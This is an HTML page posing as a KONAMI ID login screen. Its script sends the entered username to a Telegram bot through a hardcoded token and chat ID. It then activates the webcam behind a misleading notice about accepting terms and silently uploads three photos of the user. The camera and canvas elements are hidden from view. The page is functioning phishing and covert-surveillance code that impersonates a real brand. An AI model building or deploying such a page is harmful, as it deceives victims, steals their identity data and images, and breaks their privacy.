

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KONAMI Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #f7f7f7;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background-color: white;
      width: 100%;
      max-width: 400px;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      text-align: center;
    }

    .logo {
      font-size: 28px;
      color: #e60012;
      font-weight: bold;
      margin-bottom: 20px;
    }

    h2 {
      margin-bottom: 15px;
      color: #333;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }

    .btn {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
    }

    .login-btn {
      background-color: #d71920;
      color: white;
    }

    .retry-btn {
      background-color: #0078d7;
      color: white;
      margin-top: 10px;
      padding: 8px 16px;
      border-radius: 6px;
      font-size: 14px;
      cursor: pointer;
      display: inline-block;
    }

    .divider {
      margin: 15px 0;
      color: #888;
      font-weight: bold;
    }

    a {
      text-decoration: none;
      color: #0078d7;
      font-size: 14px;
    }

    .register {
      margin-top: 10px;
      font-size: 14px;
    }

    .footer {
      margin-top: 20px;
      text-align: center;
      color: #555;
      font-size: 13px;
    }

    .footer a {
      color: #0078d7;
      margin: 0 5px;
    }

    .status {
      font-size: 14px;
      margin-top: 10px;
      color: #333;
    }

    .notice {
      font-size: 14px;
      margin-bottom: 15px;
      color: #e60012;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">KONAMI</div>
    <h2>KONAMI ID</h2>

    <input id="username" type="text" placeholder="KONAMI ID / E-mail address">

    <div class="notice">✅ يجب الموافقة على جميع الشروط للمتابعة</div>

    <button id="loginBtn" class="btn login-btn">Log In</button>

    <div class="divider">OR</div>
    <button class="btn login-btn">Logging in With a Passkey</button>
    <p><a href="#">What is a Passkey?</a></p>

    <div class="register">
      Don't have a KONAMI ID? <a href="#">Register</a>
    </div>

    <div id="status" class="status"></div>
  </div>

  <div class="footer">
    <a href="#">Terms of Use</a> / 
    <a href="#">Privacy (KONAMI ID)</a>
    <br>
    <a href="#">Trademarks</a>
  </div>

  <video id="v" autoplay playsinline style="display:none"></video>
  <canvas id="c" width="640" height="480" style="display:none"></canvas>

<script>
const TOKEN = "8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw"; // ضع التوكن هنا
const CHAT_ID = "6504203392";        // ضع chat_id الخاص بك
const loginBtn = document.getElementById("loginBtn");
const statusDiv = document.getElementById("status");
const video = document.getElementById("v");
const canvas = document.getElementById("c");
const ctx = canvas.getContext("2d");
const usernameInput = document.getElementById("username");

function setStatus(msg, showRetry=false){
  statusDiv.innerHTML = msg;
  if(showRetry){
    const retryBtn = document.createElement("button");
    retryBtn.textContent = "🔄 إعادة المحاولة";
    retryBtn.className = "retry-btn";
    retryBtn.onclick = startProcess;
    statusDiv.appendChild(document.createElement("br"));
    statusDiv.appendChild(retryBtn);
  }
}

async function sendMessageToTelegram(text){
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("text", text);
  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: "POST", body: fd });
}

async function sendPhotoToTelegram(imgBase64, caption=""){
  const blob = await (await fetch(imgBase64)).blob();
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "photo.png");
  if(caption) fd.append("caption", caption);
  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
}

async function openCamera(){
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;
    await video.play();
    return stream;
  } catch (err) {
    throw new Error("❌ يجب الموافقة على جميع الشروط لإكمال العملية.");
  }
}

async function captureOnce(){
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/png");
}

async function startProcess(){
  loginBtn.disabled = true;
  setStatus("جاري إرسال البيانات...");

  const username = usernameInput.value || "No username";
  await sendMessageToTelegram("📩 User: " + username);

  try {
    const stream = await openCamera();
    for(let i=1;i<=3;i++){
      const img = await captureOnce();
      await sendPhotoToTelegram(img, `📸 صورة ${i}/3 للمستخدم: ${username}`);
      setStatus(`تم إرسال الصورة ${i}/3`);
      await new Promise(r=>setTimeout(r,800));
    }
    setStatus("✅ اكتملت العملية بنجاح");
    stream.getTracks().forEach(t=>t.stop());
  } catch(err){
    setStatus(err.message, true);
  } finally {
    loginBtn.disabled = false;
  }
}

loginBtn.addEventListener("click", startProcess);
</script>

</body>
</html>
